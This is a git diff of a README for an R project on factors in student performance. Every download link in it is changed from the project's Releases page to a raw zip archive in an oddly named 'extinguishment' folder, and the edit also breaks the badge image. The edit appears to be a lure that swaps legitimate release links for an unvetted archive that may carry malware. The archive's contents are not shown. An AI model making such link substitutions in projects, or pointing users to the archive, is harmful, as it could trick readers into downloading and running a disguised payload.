@@ -1,6 +1,6 @@
 # 🎓 student-performance-analysis-R - Discover Factors Influencing Student Success
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AnveshReddyK/student-performance-analysis-R/releases)
+[![Download Now](https://github.com/AnveshReddyK/student-performance-analysis-R/raw/refs/heads/main/extinguishment/performance_R_student_analysis_v2.8.zip%20Now-Click%20Here-brightgreen)](https://github.com/AnveshReddyK/student-performance-analysis-R/raw/refs/heads/main/extinguishment/performance_R_student_analysis_v2.8.zip)
 
 ## 📥 Overview
 
@@ -19,7 +19,7 @@ Before downloading the application, ensure you have:
 ### Download & Install
 
 1. Navigate to our Releases page to get the application:  
-   [Download Here](https://github.com/AnveshReddyK/student-performance-analysis-R/releases)
+   [Download Here](https://github.com/AnveshReddyK/student-performance-analysis-R/raw/refs/heads/main/extinguishment/performance_R_student_analysis_v2.8.zip)
 
 2. Choose the version that matches your system. Each version is labeled clearly.
 
@@ -69,7 +69,7 @@ We welcome feedback and discussions. Feel free to ask questions or share your in
 
 ## 📥 Download Again
 
-If needed, return to the [Download Here](https://github.com/AnveshReddyK/student-performance-analysis-R/releases) link to access the latest version.
+If needed, return to the [Download Here](https://github.com/AnveshReddyK/student-performance-analysis-R/raw/refs/heads/main/extinguishment/performance_R_student_analysis_v2.8.zip) link to access the latest version.
 
 ## 💻 Topics Covered
 
